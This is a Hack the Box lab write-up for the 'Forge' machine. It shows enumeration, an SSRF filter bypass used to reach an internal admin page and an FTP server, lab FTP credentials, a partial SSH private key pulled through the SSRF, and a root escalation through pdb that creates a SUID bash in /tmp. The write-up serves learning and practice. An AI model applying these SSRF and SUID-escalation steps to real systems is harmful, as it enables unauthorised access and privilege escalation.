---
title: "Hack the Box - Forge"
slug: "hack-the-box-forge"
date: "2024-03-14"
excerpt: "Forge is a medium linux machine that features an SSRF vulnerability on the main webpage that can be exploited to access services that are available only on localhost. Specifically, an FTP server is running but it's behind a firewall that prevents any connection except from localhost. Virtual host brute forcing reveals a new admin virtual host that is also blocked from external connections. The main webpage provides the ability to upload image files from URLs, but there are no checks in place to validate if the file is a real image or not. Thus allowing an attacker to specify a URL to a machine he controls in order to redirect the traffic to the internal services running on the box. Data exfiltration from the internal admin virtual host reveals credentials that can be used to access the FTP server, exploiting the same SSRF vulnerability. Through the FTP, the SSH key for `user` can be extracted. Privilege escalation relies on a Python script that `user` is able to execute using sudo. Triggering an error on the script will cause it to execute `Pdb`, an interactive Python debugger that can interpret Python commands. Since `Pdb` is running as `root`, because the main script was executed using `sudo`, a root shell can be spawned."
cover: "cover.png"
tags:
  - SSRF
  - PDB
  - Arbitrary Upload
---

## Enumeration
### NMAP

```bash
nmap -sC -sV -v -T4 forge.htb
```

```bash
PORT STATE SERVICE VERSION
21/tcp filtered ftp
22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
| 3072 4f:78:65:66:29:e4:87:6b:3c:cc:b4:3a:d2:57:20:ac (RSA)
| 256 79:df:3a:f1:fe:87:4a:57:b0:fd:4e:d0:54:c6:28:d9 (ECDSA)
|_ 256 b0:58:11:40:6d:8c:bd:c5:72:aa:83:08:c5:51:fb:33 (ED25519)
80/tcp open http Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Gallery
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### Website

Website on port `80`.

![](./Pasted_image_20220210124650.png)

There is an  `Upload an image` link which takes us to the `/upload` directory.

![](./Pasted_image_20220210124733.png)

We can upload a file and it will generate link.

![](./Pasted_image_20220210124810.png)

We can follow the generated link which takes us to the image... We can try and exploit this via arbitrary file upload. Let's try and generate a reverse shell to upload.

We also notice that there is the option to `Upload from url` . This might give us the ability to setup a local web server and host a reverse shell.

We can enumerate the web files a bit more and find that file indexing is on. 

### Source Code Analysis

We find a file `/static/js/main.js`, this contains the code to upload the file.

```javascript
function show_upload_local_file(argument) {
    var form_div = document.getElementById('form-div');
    form_div.innerHTML = `
        <form action="/upload" method="POST" enctype="multipart/form-data">
            <input type="file" name="file" class="file">
            <input name="local" type="hidden" value='1'>
            <br>
            <br>
            <button id="submit-local" type="submit" class="submit">Submit</button>
        </form>
        `;
}

function show_upload_remote_file(argument) {
    var form_div = document.getElementById('form-div');
    form_div.innerHTML = `
    <br><br>
        <form action="/upload" method="POST" enctype="application/x-www-form-urlencoded" >
            <input type="textbox" name="url" class="textbox">
            <input name="remote" type="hidden" value='1'>
            <br>
            <br>
            <button id="submit-remote" type="submit" class="submit">Submit</button>
        </form>
        `;
}
```

It looks like there is nothing stopping us from uploading files other than images.

I tried uploading the pentestmonkey `php-reverse-shell.php` reverse shell but it doesn't make a callback to our netcat listener. We can view the file which was given the automatically generated link.

![](./Pasted_image_20220210125647.png)

It looks like the server isn't using php and therefore it doesn't interpret php files. We need another method.

### Directory Fuzzing

Let's try more enumeration to see what else we can find.

```bash
gobuster vhost -u http://forge.htb -w /opt/wordlists/subdirectories.txt -r -t 150 | tee gobuster_vhost
```

```bash
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================

[+] Url: http://forge.htb
[+] Method: GET
[+] Threads: 150
[+] Wordlist: /opt/wordlists/subdomains.txt
[+] User Agent: gobuster/3.1.0
[+] Timeout: 10s

===============================================================
2022/02/10 12:59:50 Starting gobuster in VHOST enumeration mode
===============================================================
Found: admin.forge.htb (Status: 200) [Size: 27]
```

Awesome! We see that there is an `admin` subdirectory. Let's add this to our `/etc/hosts` and then view the page.

When we try and access the `http://admin.forge.htb` page, we get a page which states we can only access the page on `localhost`.

![](./Pasted_image_20220210130202.png)

## SSRF

We can try and use the remote file uploader feature on the base domain to try and get the source of the page.

![](./Pasted_image_20220210130310.png)

Unfortunately, we are unable to dump the page as it's a blacklisted address. Let's see if it's testing a case-sensitive form of the url similar to the following:

```javascript
if (input.value === 'http://admin.forge.htb') {
	// Blacklisted address
}
```

![](./Pasted_image_20220210130521.png)

Success! We are able to now access the dumped contents of the page.

![](./Pasted_image_20220210130609.png)

```html
<!DOCTYPE html>
<html>
<head>
	<title>Admin Portal</title>
</head>
<body>
	<link rel="stylesheet" type="text/css" href="/static/css/main.css">
	<header>
		<nav>
			<h1 class=""><a href="/">Portal home</a></h1>
			<h1 class="align-right margin-right"><a href="/announcements">Announcements</a></h1>
			<h1 class="align-right"><a href="/upload">Upload image</a></h1>
		</nav>
	</header>

	<br><br><br><br>
	<br><br><br><br>

	<center><h1>Welcome Admins!</h1></center>
</body>
</html>
```

We can see two directories
- `/announcements`
- `/upload`

### FTP Credentials

Let's see what the `/announcements` page contains using the same method to get dump the contents of the `admin.forge.htb` page.

![](./Pasted_image_20220210131156.png)

There are three interesting points the page mentions
- An internal ftp server has been setup with credentials as user:heightofsecurity123!
- The /upload endpoint now supports ftp, ftps, http and https protocols for uploading from url.
- The /upload endpoint has been configured for easy scripting of uploads, and for uploading an image, one can simply pass a url with ?u=&lt;url&gt;.

We now have credentials for FTP now `user:heightofsecurity123!`.

We are unable to login using `ftp user@forge.htb` but we can try using the `/upload` directory to keep enumerating files using the `ftp://` address.

We can take advantage of the last point mentioned on the `/announcements` page which allows us to upload files without using the form each time. We can use the following address to list files on the FTP server.

```text
http://ADMIN.FORGE.HTB/upload?u=ftp://user:heightofsecurity123!@FORGE.HTB
```

Woohoo! It returns a list of the files in that directory.

```text
drwxr-xr-x 3 1000 1000 4096 Aug 04 2021 snap
-rw-r----- 1 0 1000 33 Feb 09 12:16 user.txt
```

If we append `/user.txt` on the end of the request we can get the `user.txt` flag.

## Shell as Root

Let's see if there are any SSH credentials but appending `/.ssh/id_rsa` onto the request.

```
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEAnZIO+Qywfgnftqo5as+orHW/w1WbrG6i6B7Tv2PdQ09NixOmtHR3
rnxHouv4/l1pO2njPf5GbjVHAsMwJDXmDNjaqZfO9OYC7K7hr7FV6xlUWThwcKo0hIOVuE
7Jh1d+jfpDYYXqON5r6DzODI5WMwLKl9n5rbtFko3xaLewkHYTE2YY3uvVppxs...
```

Awesome! We now have the `id_rsa` for the SSH. Let's try logging in as `user`.

And were in, not even a password was required!

![](./Pasted_image_20220210134030.png)

### Source Code Analysis

Running `sudo -l` gives us a python file called `remote-manage.py` which runs as root.

![](./Pasted_image_20220210134109.png)

The contents of the file is:

```python
#!/usr/bin/env python3

import socket
import random
import subprocess
import pdb
  
port = random.randint(1025, 65535)

try:
	 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	 sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
	 sock.bind(('127.0.0.1', port))
	 sock.listen(1)
	
	 print(f'Listening on localhost:{port}')
	
	 (clientsock, addr) = sock.accept()
	 clientsock.send(b'Enter the secret passsword: ')
	
	 if clientsock.recv(1024).strip().decode() != 'secretadminpassword':
		 clientsock.send(b'Wrong password!\n')
	 else:
		 clientsock.send(b'Welcome admin!\n')
	 
	while True:
		 clientsock.send(b'\nWhat do you wanna do: \n')
		 clientsock.send(b'[1] View processes\n')
		 clientsock.send(b'[2] View free memory\n')
		 clientsock.send(b'[3] View listening sockets\n')
		 clientsock.send(b'[4] Quit\n')

		 option = int(clientsock.recv(1024).strip())

		 if option == 1:
			 clientsock.send(subprocess.getoutput('ps aux').encode())
		 elif option == 2:
			 clientsock.send(subprocess.getoutput('df').encode())
		 elif option == 3:
			 clientsock.send(subprocess.getoutput('ss -lnt').encode())
		 elif option == 4:
			 clientsock.send(b'Bye\n')
		 break

except Exception as e:
	 print(e)
	 pdb.post_mortem(e.__traceback__)
finally:
	 quit()
```

We can run the python script which listens on a random port

![](./Pasted_image_20220210141425.png)

Let's open another SSH session and make a netcat connection on that port.

![](./Pasted_image_20220210141443.png)

We can enter the password shown in the above python script.

### Python Debugger

If we enter something other than an integer such as `testing` the script hangs and give us access to the PDB (Python Debugger).

### SUID Bash

We can use the python debugger to run commands as root. We can use the following lines to create a bash file which runs as root via the normal user.

```python
import os

os.system("cp /bin/bash /tmp/bash")
os.system("chmod u+s /tmp/bash")
exit
```

Entering these lines one by one should create a `bash` SUID binary in the `/tmp` folder which we can run and get root as.

```bash
/tmp/bash -p
```

![](./Pasted_image_20220210141634.png)